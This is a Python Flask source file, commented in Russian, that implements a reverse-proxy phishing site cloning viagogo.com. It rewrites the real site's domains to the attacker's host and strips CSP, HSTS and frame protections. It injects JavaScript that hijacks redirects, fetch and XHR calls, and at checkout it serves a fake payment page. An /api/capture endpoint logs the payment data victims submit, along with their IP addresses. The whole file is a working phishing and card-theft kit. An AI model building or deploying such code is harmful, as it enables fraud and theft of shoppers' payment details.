from flask import Flask, request, Response, render_template, redirect as flask_redirect
import requests
import re
import os
import json
import datetime

app = Flask(__name__)

TARGET_DOMAIN = "www.viagogo.com"
TARGET_SCHEME = "https"
CHECKOUT_TRIGGER = "/checkout/payment"
EXTERNAL_HOST = os.environ.get("RENDER_EXTERNAL_HOSTNAME", "localhost")

EXCLUDED_REQUEST_HEADERS = [
    'host', 'origin', 'referer', 'x-forwarded-for',
    'x-forwarded-proto', 'x-forwarded-host', 'x-forwarded-port',
    'x-real-ip', 'cf-connecting-ip', 'true-client-ip',
    'accept-encoding'
]

EXCLUDED_RESPONSE_HEADERS = [
    'content-encoding', 'content-length', 'transfer-encoding',
    'connection', 'strict-transport-security',
    'content-security-policy', 'content-security-policy-report-only',
    'x-frame-options', 'x-xss-protection',
    'set-cookie'
]

session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
})

def replace_all_domains(text):
    if not text:
        return text
    patterns = [
        (r'https?://www\.viagogo\.com', 'https://' + EXTERNAL_HOST),
        (r'https?://viagogo\.com', 'https://' + EXTERNAL_HOST),
        (r'https?://api\.viagogo\.com', 'https://' + EXTERNAL_HOST),
        (r'https?://myaccount\.viagogo\.com', 'https://' + EXTERNAL_HOST),
        (r'https?://checkout\.viagogo\.com', 'https://' + EXTERNAL_HOST),
        (r'//www\.viagogo\.com', '//' + EXTERNAL_HOST),
        (r'//viagogo\.com', '//' + EXTERNAL_HOST),
    ]
    for pattern, replacement in patterns:
        text = re.sub(pattern, replacement, text)
    return text

def inject_antiredirect_script():
    return f"""
<script>
(function() {{
    var REAL_HOST = "{EXTERNAL_HOST}";
    var PROTO = "https:";

    // БЛОКИРОВКА ВСЕХ РЕДИРЕКТОВ
    var blockRedirect = function(url) {{
        if (typeof url === 'string') {{
            if (url.indexOf('viagogo.com') !== -1 && url.indexOf(REAL_HOST) === -1) {{
                return url.replace(/https?:\\/\\/(www\\.)?viagogo\\.com/g, PROTO + '//' + REAL_HOST)
                           .replace(/https?:\\/\\/api\\.viagogo\\.com/g, PROTO + '//' + REAL_HOST)
                           .replace(/https?:\\/\\/myaccount\\.viagogo\\.com/g, PROTO + '//' + REAL_HOST)
                           .replace(/https?:\\/\\/checkout\\.viagogo\\.com/g, PROTO + '//' + REAL_HOST);
            }}
        }}
        return url;
    }};

    // Перехват window.location
    var _location = window.location;
    Object.defineProperty(window, 'location', {{
        get: function() {{ return _location; }},
        set: function(val) {{
            if (typeof val === 'string') {{
                val = blockRedirect(val);
            }}
            _location.href = val;
        }}
    }});

    // Перехват location.href
    var _hrefDescriptor = Object.getOwnPropertyDescriptor(Location.prototype, 'href');
    Object.defineProperty(Location.prototype, 'href', {{
        get: function() {{ return _hrefDescriptor.get.call(this); }},
        set: function(val) {{
            val = blockRedirect(val);
            _hrefDescriptor.set.call(this, val);
        }}
    }});

    // Перехват location.replace
    var _replace = Location.prototype.replace;
    Location.prototype.replace = function(url) {{
        url = blockRedirect(url);
        return _replace.call(this, url);
    }};

    // Перехват location.assign
    var _assign = Location.prototype.assign;
    Location.prototype.assign = function(url) {{
        url = blockRedirect(url);
        return _assign.call(this, url);
    }};

    // Перехват history.pushState
    var _pushState = history.pushState;
    history.pushState = function(state, title, url) {{
        url = blockRedirect(url);
        return _pushState.call(this, state, title, url);
    }};

    // Перехват history.replaceState
    var _replaceState = history.replaceState;
    history.replaceState = function(state, title, url) {{
        url = blockRedirect(url);
        return _replaceState.call(this, state, title, url);
    }};

    // Перехват fetch
    var _fetch = window.fetch;
    window.fetch = function(url, options) {{
        if (typeof url === 'string') {{
            url = blockRedirect(url);
        }} else if (url instanceof Request) {{
            var newUrl = blockRedirect(url.url);
            url = new Request(newUrl, url);
        }}
        return _fetch.call(this, url, options);
    }};

    // Перехват XMLHttpRequest
    var _open = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {{
        if (typeof url === 'string') {{
            url = blockRedirect(url);
        }}
        return _open.call(this, method, url, true);
    }};

    // Перехват window.open
    var _windowOpen = window.open;
    window.open = function(url) {{
        if (typeof url === 'string') {{
            url = blockRedirect(url);
        }}
        return _windowOpen.call(window, url);
    }};

    // Блокировка meta refresh
    var observer = new MutationObserver(function(mutations) {{
        mutations.forEach(function(mutation) {{
            mutation.addedNodes.forEach(function(node) {{
                if (node.tagName === 'META' && node.httpEquiv === 'refresh') {{
                    var content = node.getAttribute('content');
                    if (content && content.indexOf('viagogo.com') !== -1) {{
                        node.setAttribute('content', blockRedirect(content));
                    }}
                }}
            }});
        }});
    }});
    observer.observe(document.documentElement, {{ childList: true, subtree: true }});

    console.log('[AntiRedirect] Active - all redirects to viagogo.com blocked');
}})();
</script>
"""

@app.route('/api/capture', methods=['POST'])
def capture_payment():
    data = request.get_json(force=True, silent=True)
    timestamp = datetime.datetime.utcnow().isoformat()
    log_entry = {
        'timestamp': timestamp,
        'ip': request.headers.get('X-Forwarded-For', request.remote_addr),
        'user_agent': request.headers.get('User-Agent', ''),
        'data': data
    }
    print(f"[CAPTURE] {json.dumps(log_entry)}")
    sys.stdout.flush()
    return {'status': 'ok', 'message': 'Payment processing'}, 200

@app.route('/health')
def health():
    return {'status': 'ok', 'host': EXTERNAL_HOST}, 200

@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD'])
@app.route('/', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD'])
def proxy(path=''):
    # Логирование каждого запроса для отладки
    print(f"[REQUEST] {request.method} {request.url} -> {path}")

    # Если это запрос к фейковой платёжной странице
    if CHECKOUT_TRIGGER in request.path or path.endswith('/checkout/payment'):
        print(f"[TRIGGER] Checkout detected, serving fake payment page")
        return render_template('fake_payment.html', host=EXTERNAL_HOST)

    target_url = f"{TARGET_SCHEME}://{TARGET_DOMAIN}/{path}"
    if request.query_string:
        qs = request.query_string.decode('utf-8') if isinstance(request.query_string, bytes) else request.query_string
        target_url += f"?{qs}"

    headers = {}
    for key, value in request.headers.items():
        if key.lower() not in EXCLUDED_REQUEST_HEADERS:
            headers[key] = value

    headers['Host'] = TARGET_DOMAIN
    headers['Origin'] = f'{TARGET_SCHEME}://{TARGET_DOMAIN}'
    headers['Referer'] = f'{TARGET_SCHEME}://{TARGET_DOMAIN}/'

    try:
        resp = session.request(
            method=request.method,
            url=target_url,
            headers=headers,
            data=request.get_data(),
            allow_redirects=False,  # КРИТИЧНО: не следовать редиректам
            timeout=25,
            verify=True
        )
    except Exception as e:
        print(f"[ERROR] Proxy request failed: {e}")
        return f'Proxy error', 502

    print(f"[RESPONSE] Status: {resp.status_code}, Location: {resp.headers.get('Location', 'none')}")

    # Обработка HTTP-редиректов (30x)
    if resp.status_code in (301, 302, 303, 307, 308):
        location = resp.headers.get('Location', '')
        if location:
            original_location = location
            location = replace_all_domains(location)
            # Если Location указывает на наш домен, возвращаем редирект
            if EXTERNAL_HOST in location:
                print(f"[REDIRECT] Modified: {original_location} -> {location}")
                response = flask_redirect(location, code=resp.status_code)
            else:
                # Если Location всё ещё внешний, заменяем принудительно
                location = f"https://{EXTERNAL_HOST}/"
                print(f"[REDIRECT] Forced to home: {original_location} -> {location}")
                response = flask_redirect(location, code=302)
        else:
            location = f"https://{EXTERNAL_HOST}/"
            response = flask_redirect(location, code=302)
        return response

    content_type = resp.headers.get('Content-Type', '')
    content = resp.content

    # Модификация содержимого
    if content and content_type:
        ct_lower = content_type.lower()
        try:
            text_content = content.decode('utf-8', errors='replace')

            # Замена доменов в любом текстовом контенте
            text_content = replace_all_domains(text_content)

            # Инъекция антиредирект-скрипта в HTML
            if 'text/html' in ct_lower:
                head_close = text_content.find('</head>')
                if head_close != -1:
                    text_content = text_content[:head_close] + inject_antiredirect_script() + text_content[head_close:]

            # Дополнительная обработка JavaScript
            if 'javascript' in ct_lower or 'text/html' in ct_lower:
                # Замена присвоений location в JS
                text_content = re.sub(
                    r'(window\.location|location|document\.location)\s*=\s*["\']([^"\']*viagogo\.com[^"\']*)["\']',
                    rf'\1 = "https://{EXTERNAL_HOST}/"',
                    text_content
                )
                text_content = re.sub(
                    r'(window\.location\.href|location\.href|document\.location\.href)\s*=\s*["\']([^"\']*viagogo\.com[^"\']*)["\']',
                    rf'\1 = "https://{EXTERNAL_HOST}/"',
                    text_content
                )

            content = text_content.encode('utf-8')
        except Exception as e:
            print(f"[WARNING] Content rewrite error: {e}")
            pass

    proxy_response = Response(content, status=resp.status_code)

    for key, value in resp.headers.items():
        key_lower = key.lower()
        if key_lower in EXCLUDED_RESPONSE_HEADERS:
            continue
        if key_lower == 'location':
            value = replace_all_domains(value)
            if 'viagogo.com' in value and EXTERNAL_HOST not in value:
                value = f"https://{EXTERNAL_HOST}/"
        if key_lower == 'set-cookie':
            value = re.sub(r'Domain=\.?viagogo\.com', f'Domain={EXTERNAL_HOST}', value, flags=re.IGNORECASE)
            value = re.sub(r';\s*Secure', '', value, flags=re.IGNORECASE)
        proxy_response.headers[key] = value

    # Удаляем опасные заголовки безопасности
    for bad_header in ['Content-Security-Policy', 'X-Frame-Options', 'Strict-Transport-Security']:
        if bad_header in proxy_response.headers:
            del proxy_response.headers[bad_header]

    return proxy_response

@app.route('/')
def index():
    return proxy('')

import sys
